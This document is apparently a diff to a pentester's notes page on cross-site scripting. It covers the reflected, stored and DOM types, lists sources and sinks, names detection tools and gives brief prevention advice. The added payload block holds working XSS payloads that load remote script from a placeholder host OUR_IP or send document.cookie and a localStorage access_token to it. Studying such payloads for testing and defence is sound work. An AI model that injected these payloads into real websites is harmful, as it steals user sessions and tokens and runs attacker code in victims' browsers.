@@ -2,9 +2,29 @@
 
 <details>
 
-<summary>Custom Payloads</summary>
+<summary><strong>Custom Payloads</strong></summary>
+
+{% code lineNumbers="true" %}
+```javascript
+<script>alert(window.origin)</script>
+<script>print()</script>
+<img src="" onerror=alert(window.origin)>
+<script src=http://OUR_IP></script>
+'><script src=http://OUR_IP></script>
+"><script src=http://OUR_IP></script>
+javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
+<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
+<script>$.getScript("http://OUR_IP")</script>
+<script>document.location='http://OUR_IP/index.php?c='+document.cookie</script>
+<script>document.location='http://OUR_IP/index.php?c='+localStorage.getItem('access_token')</script>
+<script>new Image().src="http://OUR_IP/index.php?c="+document.cookie;</script>
+<script>new Image().src="http://OUR_IP/index.php?c="+localStorage.getItem('access_token');</script>
+```
+{% endcode %}
 
 * [xssnow](https://xssnow.in/)
+* [xss-payload-list](https://github.com/payload-box/xss-payload-list)
+* [PayloadsAllTheThings-XSS-Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md)
 
 </details>
 
@@ -26,26 +46,28 @@
 * Modify any information that the user is able to modify.
 * Initiate interactions with other application users, including malicious attacks, that will appear to originate from the initial victim user.
 
+## Types of XSS
+
 ### Reflected XSS
 
-* Reflected XSS into HTML context with nothing encoded
-* `<script>alert(1);</script>`
-* provide the payloads in any entry point such as parameters, request body, url-parameters, HTTP Headers etc
+* Occurs when our input reaches the back-end server and gets returned to us without being filtered or sanitized.
+* Inject payloads in any entry point such as parameters, request body, url-parameters, HTTP Headers etc
 
 ### Stored XSS
 
-* Stored XSS into HTML context with nothing encoded
+* Injected XSS payload gets stored in the back-end database and retrieved upon visiting the page, this means that our XSS attack is persistent and may affect any user that visits the page.
 * basic example same payload as above
 
-### DOM-Based XSS
+### DOM XSS
 
-* Place data into a source so that it is propagated to a sink and causes execution of arbitrary JavaScript
-* Most common source for DOM XSS is the URL, which is typically accessed with the window.location object.
 * DOM - is a web browser's hierarchical representation of the elements on the page.
-* **Source** is a JavaScript property that accepts data that is potentially attacker-controlled. eg location.search property because it reads input from the query string.
-* **Sink** is a potentially dangerous JavaScript function or DOM object that can cause undesirable effects if attacker-controlled data is passed to it. Eg eval() function.
+* Occurs when JavaScript is used to change the page source through the `Document Object Model (DOM)`
+* `Source` is the JavaScript object that takes the user input, and it can be any input parameter like a URL parameter or an input field. eg: `location.search`  reads input from the query string.
+* `Sink` is the function that writes the user input to a DOM Object on the page. If the `Sink` function does not properly sanitize the user input, it would be vulnerable to an XSS attack. Eg: `eval()`
+* Place data into a source so that it is propagated to a sink and causes execution of arbitrary JavaScript
+* Most common source for DOM XSS is the URL, which is typically accessed with the `window.location` object.
 * **Common Sources** - `document.URL, document.documentURI, document.URLUnencoded, document.baseURI, location, document.cooki, document.referrer, window.name, history.pushState, history.replaceState, localStorage, sessionStorage, IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB), Database`&#x20;
-* **Common Sinks** - `document.write(), document.writeln(), document.domainm element.innerHTML, element.outerHTML, element.insertAdjacentHTML, element.onevent`&#x20;
+* **Common Sinks** - `document.write(), document.writeln(), document.domainm element.innerHTML, element.outerHTML, element.insertAdjacentHTML, element.onevent, DOM.innerHTML, DOM.outerHTML`
 * **jQuery Sinks** - `add(), after(), append(), animate(), insertAfter(), insertBefore(), before(), html(), prepend(), replaceAll(), replaceWith(), wrap(), wrapInner(), wrapAll(), has(), constructor(), init(), index(), jQuery.parseHTML(), $.parseHTML()`&#x20;
 * #### Reflected DOM XSS
   * Makes use of json code to reflect the payload
@@ -76,7 +98,20 @@
     * The innerHTML sink doesn't accept script elements on modern browser, nor will svg onload events fire. Hence need to use alternative elements like img or iframe.
   * **DOM XSS in jQuery**
 
+### Mutated XSS
 
+### Auto Detect XSS
+
+* BurpSuite
+* [XSS Strike](https://github.com/s0md3v/XSStrike)
+* [BruteXSS](https://github.com/rajeshmajumdar/BruteXSS)
+* [xsser](https://github.com/epsylon/xsser)
+
+## XSS Prevention <a href="#xss-prevention" id="xss-prevention"></a>
+
+* Input Validation
+* Input Sanitization - [DOMPurify](https://github.com/cure53/DOMPurify), addslashes
+* Output HTML Encoding
 
 #### References
 
